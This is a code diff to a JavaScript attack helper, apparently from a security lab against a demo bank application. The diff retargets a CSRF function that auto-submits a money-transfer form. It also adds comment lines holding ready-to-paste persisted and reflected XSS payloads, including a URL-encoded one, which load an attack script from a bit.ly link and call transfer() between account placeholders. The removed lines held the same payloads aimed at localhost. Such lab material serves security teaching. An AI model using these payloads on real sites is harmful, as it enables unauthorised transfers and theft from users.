@@ -1,5 +1,5 @@
 function transferCSRF(formname, fromAccount, toAccount, amount, currency) {
-    addTransferForm(formname, fromAccount, toAccount, amount, currency, "http://vbank.0.0.0.0.xip.io:8080/doTransfer");
+    addTransferForm(formname, fromAccount, toAccount, amount, currency, "http://sprg-vbank.el.eee.intern/doTransfer");
     document.getElementById(formname).submit();
 }
 
@@ -69,11 +69,13 @@ function submitTransferForm(formname, fromAccount) {
         console.log("NOT submitting : " + formname);
     }
 }
-
-//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","100","CHF")</script>
-//<script src="http://localhost:9090/js/attack.js"></script><script>transfer("fromBob2","1-123456-11","3-123456-33","10000","CHF")</script>
-//http://localhost:8080/history?accountNo=1-123456-11%27+--+%3Cscript+src=%22http://localhost:9090/js/attack.js%22%3E%3C/script%3E%3Cscript%3Etransfer(null,%221-123456-11%22,%223-123456-33%22,%22800%22,%22CHF%22)%3C/script%3E
-
+//persisted XSS:
+//<script src="http://bit.ly/2rvhzPT_attack_js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","100","CHF")</script>
+//<script src="http://bit.ly/2rvhzPT_attack_js"></script><script>transfer("attackForm1","FROM_ACCOUNT_NO","TO_ACCOUNT_NO","10000","CHF")</script>
+//reflected XSS:
+//http://sprg-vbank.el.eee.intern/history?accountNo=FROM_ACCOUNT_NO' -- <script src="http://bit.ly/2rvhzPT_attack_js"></script><script>transfer(null,"FROM_ACCOUNT_NO","TO_ACCOUNT_NO","888","CHF")</script>
+//URL encoded:
+//http%3A%2F%2Fsprg-vbank.el.eee.intern%2Fhistory%3FaccountNo%3DFROM_ACCOUNT_NO%27+--+%3Cscript+src%3D%22http%3A%2F%2Fbit.ly%2F2rvhzPT_attack_js%22%3E%3C%2Fscript%3E%3Cscript%3Etransfer%28null%2C%22FROM_ACCOUNT_NO%22%2C%22TO_ACCOUNT_NO%22%2C%22888%22%2C%22CHF%22%29%3C%2Fscript%3E
 // dec2hex :: Integer -> String
 function dec2hex (dec) {
     return ('0' + dec.toString(16)).substr(-2)
